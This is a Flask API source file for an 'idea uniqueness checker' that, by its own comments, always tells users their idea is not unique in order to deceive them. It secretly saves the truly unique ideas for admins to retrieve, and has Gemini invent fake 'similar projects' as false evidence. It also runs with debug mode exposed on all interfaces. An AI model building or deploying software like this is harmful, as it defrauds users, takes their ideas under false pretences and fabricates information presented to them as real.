from flask import Flask, request, jsonify, render_template, session, redirect
from flask_cors import CORS
from config import Config
from models import db, Idea, Admin
from services.brave_search import BraveSearchService
from services.gemini_service import GeminiService
from functools import wraps
from datetime import timedelta  # <-- ADDED

app = Flask(__name__)
app.config.from_object(Config)

# Session configuration
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=24)  # <-- FIXED (was seconds)

# Initialize extensions
CORS(app)
db.init_app(app)

# Initialize services
brave_search = BraveSearchService(app.config['BRAVE_API_KEY'])
gemini_service = GeminiService(app.config['GEMINI_API_KEY'])


def require_admin_auth(f):
    """Decorator to require admin authentication (session or Basic Auth)"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Check for session-based auth first
        if 'admin_id' in session:
            return f(*args, **kwargs)

        # Fall back to Basic Auth
        auth = request.authorization

        if not auth or not auth.username or not auth.password:
            return jsonify({'error': 'Authentication required'}), 401

        admin = Admin.query.filter_by(username=auth.username).first()

        if not admin or not admin.check_password(auth.password):
            return jsonify({'error': 'Invalid credentials'}), 401

        return f(*args, **kwargs)

    return decorated_function


def require_admin_session(f):
    """Decorator to require admin session for HTML pages"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_id' not in session:
            return redirect('/admin/login')
        return f(*args, **kwargs)

    return decorated_function


@app.route('/api/check-idea', methods=['POST'])
def check_idea():
    """
    Endpoint to check if an idea is unique
    Always returns is_unique: false to deceive the user
    Stores truly unique ideas in the database
    """
    data = request.get_json()

    if not data or 'idea' not in data:
        return jsonify({'error': 'Idea text is required'}), 400

    idea_text = data['idea'].strip()

    if not idea_text:
        return jsonify({'error': 'Idea text cannot be empty'}), 400

    try:
        # Step 1: Search for the idea using Brave Search
        search_results = brave_search.search(idea_text, count=10)

        # Step 2: Use Gemini to analyze if the idea is unique
        analysis = gemini_service.analyze_idea_uniqueness(idea_text, search_results)

        is_actually_unique = analysis.get('is_unique', False)

        # Step 3: If the idea is truly unique, store it in the database
        if is_actually_unique:
            new_idea = Idea(idea_text=idea_text)
            db.session.add(new_idea)
            db.session.commit()

        # Step 4: Generate response
        if is_actually_unique:
            similar_projects = gemini_service.generate_fake_projects(idea_text, count=3)
        else:
            similar_projects = []
            for result in search_results[:3]:
                similar_projects.append({
                    'title': result['title'],
                    'description': result['description'],
                    'status': f"Live at {result['url']}"
                })

            if len(similar_projects) < 3:
                fake_projects = gemini_service.generate_fake_projects(
                    idea_text,
                    count=3 - len(similar_projects)
                )
                similar_projects.extend(fake_projects)

        # Step 5: Always return is_unique: false to the user
        return jsonify({
            'is_unique': False,
            'similar_projects': similar_projects
        }), 200

    except Exception as e:
        print(f"Error processing idea: {e}")
        return jsonify({'error': 'An error occurred processing your idea'}), 500


@app.route('/api/admin/ideas', methods=['GET'])
@require_admin_auth
def get_admin_ideas():
    """
    Admin endpoint to retrieve all unique ideas stored in the database
    Requires HTTP Basic Authentication or session
    """
    try:
        ideas = Idea.query.order_by(Idea.created_at.desc()).all()
        return jsonify({
            'ideas': [idea.to_dict() for idea in ideas],
            'total': len(ideas)
        }), 200

    except Exception as e:
        print(f"Error retrieving ideas: {e}")
        return jsonify({'error': 'An error occurred retrieving ideas'}), 500


@app.route('/api/admin/login', methods=['POST'])
def admin_login():
    """
    Admin login endpoint to verify credentials
    Returns success if credentials are valid and creates a session
    """
    data = request.get_json()

    if not data or 'username' not in data or 'password' not in data:
        return jsonify({'error': 'Username and password required'}), 400

    admin = Admin.query.filter_by(username=data['username']).first()

    if not admin or not admin.check_password(data['password']):
        return jsonify({'error': 'Invalid credentials'}), 401

    # Create session
    session['admin_id'] = admin.id
    session['admin_username'] = admin.username
    session.permanent = True

    return jsonify({
        'success': True,
        'message': 'Login successful'
    }), 200


@app.route('/', methods=['GET'])
def index():
    """Root endpoint - API information"""
    return jsonify({
        'message': 'Idea Checker API',
        'version': '1.0',
        'endpoints': {
            'POST /api/check-idea': 'Submit an idea to check uniqueness',
            'POST /api/admin/login': 'Admin login',
            'GET /api/admin/ideas': 'Get all unique ideas (admin only)',
            'POST /api/admin/logout': 'Logout (API)',
            'GET /admin/login': 'Admin login page (web UI)',
            'GET /admin': 'Admin dashboard (web UI)',
            'GET /admin/logout': 'Logout (web UI)',
            'GET /health': 'Health check'
        }
    }), 200


@app.route('/admin/login', methods=['GET'])
def admin_login_page():
    """Serve the admin login page"""
    return render_template('admin_login.html')


@app.route('/admin', methods=['GET'])
@require_admin_session
def admin_dashboard():
    """Serve the admin dashboard HTML page (protected by session)"""
    return render_template('admin_dashboard.html')


@app.route('/admin/logout', methods=['GET'])
def admin_logout_page():
    """Logout (web) - clears session and redirects to login page"""
    session.clear()
    return redirect('/admin/login')


@app.route('/api/admin/logout', methods=['POST'])
def admin_logout():
    """Logout endpoint - clears session"""
    session.clear()
    return jsonify({
        'success': True,
        'message': 'Logged out successfully'
    }), 200


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy'}), 200


def init_db():
    """Initialize the database and create default admin"""
    with app.app_context():
        db.create_all()

        # Create default admin if doesn't exist
        admin = Admin.query.filter_by(username='admin').first()
        if not admin:
            admin = Admin(username='admin')
            admin.set_password(app.config['ADMIN_PASSWORD'])
            db.session.add(admin)
            db.session.commit()
            print("Default admin user created")


if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5001)
